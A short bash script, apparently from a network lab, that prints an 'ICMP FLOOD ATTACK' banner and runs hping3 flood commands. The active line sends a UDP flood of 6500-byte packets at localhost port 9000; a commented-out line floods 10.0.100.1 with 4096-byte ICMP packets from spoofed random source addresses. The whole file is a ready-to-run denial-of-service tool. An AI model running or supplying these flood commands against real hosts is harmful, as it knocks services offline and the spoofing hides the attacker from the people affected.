#!/bin/bash
echo "======================================="
echo "ICMP FLOOD ATTACK h_hcm 10.0.100.1"
echo "======================================"
echo "file 4096 byte"

#hping3 --icmp --flood -d 4096 --rand-source 10.0.100.1
hping3 --udp --flood -d 6500 127.0.0.1 -p 9000
